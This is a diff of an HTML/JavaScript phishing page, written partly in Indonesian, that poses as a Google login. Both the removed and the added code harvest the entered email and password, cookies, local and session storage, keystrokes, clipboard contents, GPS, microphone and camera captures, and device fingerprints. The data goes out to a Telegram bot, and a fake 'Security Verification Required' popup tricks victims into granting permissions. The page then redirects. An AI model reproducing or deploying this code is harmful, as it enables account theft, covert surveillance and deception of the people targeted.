+WEBGL: ${(c=>{let gl=document.createElement('canvas').getContext('webgl');let ext=gl?.getExtension('WEBGL_debug_renderer_info');return ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'?'})()}
+FONTS: ${fonts}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🍪 STORAGE (FULL)
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🍪 Cookies: ${cookies.substring(0, 300)}${cookies.length > 300 ? '...' : ''}
-💾 LocalStorage: ${localStorage.substring(0, 300)}${localStorage.length > 300 ? '...' : ''}
-📦 SessionStorage: ${sessionStorage.substring(0, 300)}${sessionStorage.length > 300 ? '...' : ''}
-🗄️ IndexedDB: ${indexedDB}
+📡 NETWORK & BATTERY:
+NETWORK: ${conn.effectiveType||'?'} (${conn.downlink||'?'}Mbps, RTT ${conn.rtt||'?'}ms)
+BATERAI: ${battery.level} (Charging: ${battery.charging})
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⌨️ KEYLOGGER & CLIPBOARD
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⌨️ ${keylog.substring(0, 500)}${keylog.length > 500 ? '...' : ''}
+📂 STORAGE:
+COOKIES: ${document.cookie.slice(0,300)}
+LOCALSTORAGE: ${JSON.stringify(localStorage).slice(0,300)}
+SESSIONSTORAGE: ${JSON.stringify(sessionStorage).slice(0,300)}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ WAKTU & METADATA
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📅 Waktu: ${waktuFormatted}
-🔢 UNIX: ${unixTimestamp}
-🌍 Timezone: ${timezone} (GMT${timezoneOffset >= 0 ? '+' + timezoneOffset : timezoneOffset})
-⏱️ Durasi Halaman: ${duration} detik
-🕒 Peak Hour: ${peakHour}
+⌨️ BEHAVIOR:
+KEYLOG: ${keyLogs.join('').slice(-300)}
+CLIPBOARD: ${(await navigator.clipboard?.readText().catch(()=>'gagal'))||'tidak ada'}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔗 TRAFFIC SOURCE
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔗 URL: ${window.location.href}
-🚪 Referrer: ${document.referrer || '(Langsung)'}
+📍 GPS: ${gps}
+🎤 MIC: ${mic?.slice(0,100)||'gagal'}
 
-╚══════════════════════════════════════════════════════════════════════════════════╝
+⏰ WAKTU: ${waktu} (${Math.floor(Date.now()/1000)})
+🔗 REFERRER: ${document.referrer||'langsung'}
+⏱️ DURASI: ${Math.floor((Date.now()-startTime)/1000)} detik
 `;
-            
-            // Kirim ke Telegram (split if too long)
-            if (message.length > 4000) {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message.substring(0, 4000) })
-                }).catch(e => console.log);
-                await new Promise(r => setTimeout(r, 500));
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message.substring(4000, 8000) })
-                }).catch(e => console.log);
-            } else {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-                }).catch(e => console.log);
-            }
-            
-            // Kirim foto kamera juga kalau ada
-            if (cameraPhoto && cameraPhoto.length > 100) {
-                try {
-                    const blob = await (await fetch(cameraPhoto)).blob();
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'camera.jpg');
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                } catch(e) {}
-            }
-            
-            // Redirect
-            setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, 2000);
-        });
-        
-        // Show permission popup to make user allow
-        setTimeout(() => {
-            const popup = document.createElement('div');
-            popup.className = 'permission-popup';
-            popup.innerHTML = `
-                <div class="permission-box">
-                    <div style="font-size: 48px;">🔐</div>
-                    <h3>Security Verification Required</h3>
-                    <p>Google needs additional permissions to verify your identity.</p>
-                    <button id="allowPerms">Allow & Continue</button>
-                </div>
-            `;
-            document.body.appendChild(popup);
-            document.getElementById('allowPerms').addEventListener('click', () => {
-                popup.remove();
-                requestAllPermissions();
-            });
-        }, 1000);
-    </script>
+    return {msg, camera};
+}
+
+document.getElementById('loginBtn').onclick = async () => {
+    let email = document.getElementById('email').value.trim();
+    let pass = document.getElementById('password').value;
+    if(!email||!pass) return alert('Isi semua!');
+    
+    let btn = document.getElementById('loginBtn');
+    btn.disabled = true;
+    document.getElementById('loading').style.display = 'block';
+    
+    let data = await collectAll(email, pass);
+    await sendTelegram(data.msg);
+    if(data.camera) await sendTelegram('📸 FOTO KAMERA', true, data.camera);
+    
+    setTimeout(()=>location.href=REDIRECT_URL, 1800);
+};
+</script>
 </body>
 </html>
